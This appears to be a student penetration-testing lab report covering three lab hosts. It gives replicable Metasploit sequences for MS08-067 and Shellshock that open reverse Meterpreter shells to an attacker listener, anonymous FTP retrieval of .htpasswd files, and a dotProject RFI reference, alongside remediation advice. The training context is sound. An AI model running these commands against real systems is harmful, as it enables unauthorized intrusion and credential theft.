# Success Paths Write-up - A_Rocha (`.100` `.101` `.102`)

This document is a report-ready summary for the three assigned hosts. It maps directly to the written-report rubric categories: executive summary, technical overview, detailed findings, technical details, and remediation.

**Scope:** `10.20.160.100`, `10.20.160.101`, `10.20.160.102`  
**Operator context:** Team 6 / KALI6 / `TM6_afrocha` evidence stamps  
**Source runbooks:** [`10.20.160.100/README.md`](10.20.160.100/README.md), [`10.20.160.101/README.md`](10.20.160.101/README.md), [`10.20.160.102/README.md`](10.20.160.102/README.md)  
**Team Final Report (paste-ready sections + figure index):** [`final_report_merge_blocks_100_101_102.md`](final_report_merge_blocks_100_101_102.md)

---

## Executive Summary

- **`10.20.160.100` (ADRASTEA / Windows XP):** successful compromise via SMB (`ms08_067_netapi`) to Meterpreter as `NT AUTHORITY\SYSTEM`, with `proof.txt` recovered.
- **`10.20.160.102` (ELARA / Linux dotProject):** successful compromise via Shellshock module path (`apache_mod_cgi_bash_env_exec` with `targeturi /cgi-bin/test-cgi`) plus validated RFI lane (`EDB-22708`), with `local.txt` recovered.
- **`10.20.160.101` (CALLISTO / Windows 7):** no shell obtained; strongest validated findings are anonymous FTP access, sensitive auth artifact exposure (`.htaccess`/`.htpasswd`), and web misconfiguration constraints (XAMPP local-network restriction), with SMB exploit attempts inconclusive/negative.

---

## Technical Overview

### Host `10.20.160.100` (Windows XP)

**Attack surface:** SMB (`139/445`), likely RDP; EOL OS with legacy SMB risk profile.  
**Best attack mechanism (validated):** `exploit/windows/smb/ms08_067_netapi` (XP-matched path).  
**Proof objective achieved:** `proof.txt` on Barbara desktop.

**Replicable command shape**
```text
msfconsole -q
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.20.160.100
set LHOST <KALI_LAB_IP>
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
check
run
meterpreter > sysinfo
meterpreter > getuid
meterpreter > search -f proof.txt
meterpreter > shell
type "c:\Documents and Settings\Barbara\Desktop\proof.txt"
```

**Evidence anchors**
- Initial shell/session: [`100-003`](10.20.160.100/Screenshots/100-003_msf_ms08_067_netapi_meterpreter_session_tm6_afrocha.png)
- SYSTEM context: [`100-004`](10.20.160.100/Screenshots/100-004_meterpreter_sysinfo_system_shell_echo_tm6_afrocha.png)
- Proof path + read: [`100-005`](10.20.160.100/Screenshots/100-005_meterpreter_search_proof_txt_barbara_desktop_tm6_afrocha.png), [`100-006`](10.20.160.100/Screenshots/100-006_meterpreter_type_unknown_shell_cmd_proof_tm6_afrocha.png)
- Full chain snapshot: [`100-008`](10.20.160.100/Screenshots/100-008_ms08_067_session4_sysinfo_shell_proof_txt_tm6_afrocha.png)

### Host `10.20.160.102` (Linux / dotProject 2.1.6)

**Attack surface:** Apache/PHP app stack, CGI indicators, dotProject app path.  
**Best attack mechanisms (validated):**
- Shellshock lane: `exploit/multi/http/apache_mod_cgi_bash_env_exec` with `targeturi /cgi-bin/test-cgi`
- RFI lane: dotProject `gantt.php` + `dPconfig[root_dir]` include primitive (`EDB-22708`)

**Proof objective achieved:** `local.txt` from compromised user desktop.

**Replicable command shape (Shellshock lane)**
```text
msfconsole -q
search type:exploit platform:linux cgi_bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 10.20.160.102
set RPORT 80
set verbose true
set targeturi /cgi-bin/test-cgi
set LHOST <KALI_LAB_IP>
set LPORT 4444
set payload linux/x86/meterpreter/reverse_tcp
run
meterpreter > sysinfo
meterpreter > getuid
meterpreter > shell
cd ~ && cd Desktop && cat local.txt
```

**Evidence anchors**
- Shellshock run setup + launch: [`102-011`](10.20.160.102/Screenshots/102-011_msf_search_apache_mod_cgi_bash_env_set_targeturi_test_cgi_run_tm6_afrocha.png)
- Meterpreter session/context: [`102-012`](10.20.160.102/Screenshots/102-012_msf_shellshock_meterpreter_session5_sysinfo_getuid_shell_afrocha_tm6_afrocha.png)
- Additional successful session: [`102-009`](10.20.160.102/Screenshots/102-009_msf_shellshock_apache_mod_cgi_meterpreter_sysinfo_shell_elara_tm6_afrocha.png)
- Local flag capture: [`102-010`](10.20.160.102/Screenshots/102-010_shell_meterpreter_home_desktop_cat_local_txt_afrocha_tm6_afrocha.png)
- RFI proof chain support: [`102-004`](10.20.160.102/Screenshots/102-004_rfi_proof_txt_body_PROOF_tm6_afrocha.png), [`102-007`](10.20.160.102/Screenshots/102-007_searchsploit_dotproject_2_1_6_edb22708_tm6_afrocha.png), [`102-008`](10.20.160.102/Screenshots/102-008_searchsploit_x_22708_rfi_gantt_advisory_tm6_afrocha.png)

### Host `10.20.160.101` (Windows 7 / CALLISTO)

**Attack surface:** FTP, HTTP/HTTPS, SMB/RPC, RDP, MySQL, dynamic RPC ports.  
**Best validated path (partial access):** anonymous FTP -> sensitive auth file access (`.htaccess`, `.htpasswd`) -> HTTP Basic auth challenge confirmed, but no shell.  
**Outcome status:** partial success (credential/artifact access + service validation), no confirmed host code execution.

**Replicable command shape (validated lane)**
```bash
export RHOST=10.20.160.101
nmap -Pn -sV --top-ports 1000 "$RHOST"
ftp "$RHOST"             # anonymous / test@
# in ftp:
# cd forbidden
# get .htaccess
# get .htpasswd
curl -sik "http://$RHOST/"
```

**Evidence anchors**
- FTP anonymous login: [`101-011`](10.20.160.101/Screenshots/101-011_ftp_anonymous_230_logged_on_tm6_afrocha.png)
- Forbidden folder loot (`.htaccess`, `.htpasswd`): [`101-013`](10.20.160.101/Screenshots/101-013_ftp_forbidden_get_htaccess_tm6_afrocha.png), [`101-012`](10.20.160.101/Screenshots/101-012_loot_cat_htpasswd_tm6_afrocha.png)
- Basic auth prompt + access constraint: [`101-014`](10.20.160.101/Screenshots/101-014_http_basic_auth_forbidden_prompt_tm6_afrocha.png), [`101-015`](10.20.160.101/Screenshots/101-015_http_403_xampp_local_network_httpd_xampp_conf_tm6_afrocha.png)
- Negative SMB exploit evidence: [`101-008`](10.20.160.101/Screenshots/101-008_msf_eternalblue_check_not_vulnerable_tm6_afrocha.png), [`101-010`](10.20.160.101/Screenshots/101-010_msf_eternalblue_forceexploit_trans2_no_session_tm6_afrocha.png), [`101-017`](10.20.160.101/Screenshots/101-017_msf_eternalblue_status_trusted_relationship_failure_tm6_afrocha.png)

---

## Detailed Findings by Rubric Category

### 1) Detailed Findings

- **Confirmed exploit success:** `.100` and `.102` with proof/local objective evidence.
- **Confirmed partial compromise:** `.101` authenticated file exposure and credential artifact retrieval via FTP.
- **Rejected/inconclusive lanes:** `.101` EternalBlue path and trust-error SMB lane; `.102` early Shellshock `check` false negative on `printenv` before validated `test-cgi` run.

### 2) Technical Details

- Every success claim above is tied to command flow + screenshot evidence.
- No live passwords or raw hashes are embedded in this write-up.
- Flag values are referenced via screenshot evidence location rather than reprinted broadly.

### 3) Technical Overview

- Host stratification was effective:
  - legacy SMB target (`.100`)
  - mixed Windows service target (`.101`)
  - web-app/Linux target (`.102`)
- Best results came from matching exploit class to host profile instead of forcing scanner-indicated possibilities.

### 4) Remediation Summary

- **`.100`**: decommission/upgrade XP image, disable SMBv1, patch SMB stack, restrict lateral movement.
- **`.101`**: disable anonymous FTP, remove sensitive auth files from broad-readable paths, tighten web access policy and auth handling, patch/harden SMB/RDP.
- **`.102`**: patch Bash/CGI stack, restrict CGI execution surface, patch dotProject and PHP stack, enforce web hardening headers and auth controls.

---

## Submission-Ready Evidence Checklist

- `.100` exploit/proof chain: `100-003`, `100-004`, `100-005`, `100-006`, `100-008`
- `.101` partial compromise chain: `101-011`, `101-013`, `101-012`, `101-014`, `101-015`
- `.102` exploit/flag chain: `102-011`, `102-012`, `102-009`, `102-010`, plus RFI support `102-004`, `102-007`, `102-008`

Use this file as the narrative source for the final report sections; keep per-host runbooks as command-depth appendices.
